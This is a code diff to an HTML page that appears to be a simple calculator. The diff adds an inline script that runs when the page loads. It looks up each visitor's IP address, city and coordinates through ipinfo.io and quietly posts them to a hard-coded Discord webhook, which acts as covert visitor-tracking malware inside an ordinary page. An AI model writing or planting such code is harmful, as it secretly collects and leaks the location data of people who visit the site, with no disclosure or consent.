@@ -39,5 +39,37 @@
         </div>
     </div>
     <script src="calc.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Fetch the IP address from the API
+            let ip
+
+            fetch("https://ipinfo.io/json") 
+                .then(response => response.json())
+                .then(data => {
+                    function sendMessage() {
+                      const request = new XMLHttpRequest();
+                      request.open("POST", "https://discordapp.com/api/webhooks/1330268826113409065/h0H-wNxBW-ilDGrU_XnkZ_NMB9_zrDveLrkn-z9j_nCAKDOHAnmPGjdySaXKmbWmT6FO");
+                    
+                      request.setRequestHeader('Content-type', 'application/json');
+                    
+                      const params = {
+                        username: "My Webhook Name",
+                        avatar_url: "",
+                        content: `City: (${data.city})
+IP: (${data.ip})
+Coords: (${data.loc})`
+                      }
+                  
+                      request.send(JSON.stringify(params));
+                    }
+                    sendMessage()
+                    console.log(data)
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                });
+            });
+    </script>
 </body>
 </html>
